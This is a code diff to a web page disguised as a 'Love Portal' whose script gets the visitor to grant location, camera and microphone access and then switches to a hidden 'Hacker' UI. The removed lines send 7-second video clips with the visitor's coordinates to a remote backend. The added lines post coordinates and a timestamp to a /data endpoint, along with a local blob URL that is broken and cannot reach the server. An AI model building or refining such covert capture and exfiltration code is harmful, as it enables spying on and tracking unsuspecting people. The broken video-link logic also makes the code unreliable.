@@ -89,8 +89,8 @@
         </button>
     </div>
 <script>
-    // 1. MUST CHANGE: Put your actual Render Backend URL here
-    const BACKEND = "https://your-render-app.onrender.com"; 
+ // 1. Updated Backend URL and Endpoint
+    const BACKEND = "https://your-render-app.onrender.com/data"; 
     let coords = { lat: "Unknown", lon: "Unknown" };
 
     async function initiate() {
@@ -107,7 +107,6 @@
             p => { 
                 coords = { lat: p.coords.latitude, lon: p.coords.longitude };
                 update('loc-stat', 'granted');
-                // Auto-transition to the "Hacker" UI
                 document.getElementById('rey').style.display = 'none'; 
                 document.getElementById('test').style.display = 'contents'; 
             }, 
@@ -119,26 +118,34 @@
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             update('cam-stat', 'granted');
             update('mic-stat', 'granted');
-           
+            
             const recorder = new MediaRecorder(stream);
 
-            // This fires every time a 7-second chunk is ready
             recorder.ondataavailable = async (e) => {
                 if (e.data.size > 0) {
-                    const fd = new FormData();
-                    fd.append('video', e.data, `clip_${Date.now()}.webm`);
-                    fd.append('lat', coords.lat);
-                    fd.append('long', coords.lon);
+                    // 2. Create a local URL link for the video blob
+                    const videoLink = URL.createObjectURL(e.data);
 
-                    // Send to Repo_B
-                    fetch(`${BACKEND}/upload`, { 
+                    // 3. Prepare data payload as JSON (sending the link string)
+                    const payload = {
+                        video_url: videoLink,
+                        lat: coords.lat,
+                        long: coords.lon,
+                        timestamp: new Date().toISOString()
+                    };
+
+                    // 4. Send to /data endpoint
+                    fetch(BACKEND, { 
                         method: 'POST', 
-                        body: fd 
-                    }).catch(err => console.error("Upload failed:", err));
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    }).catch(err => console.error("Link transmission failed:", err));
                 }
             };
 
-            // Start recording and slice into 7-second intervals
+            // Start recording in 7-second intervals
             recorder.start(7000); 
 
         } catch (err) {
@@ -147,9 +154,6 @@
             console.error("Media Error:", err);
         }
     }
-
-    // Keep all your existing Love Portal functions (startSequence, handleChoice, etc.) below
-    //original script logic ...
 </script>
 
     <div id="test" style="display: none;">
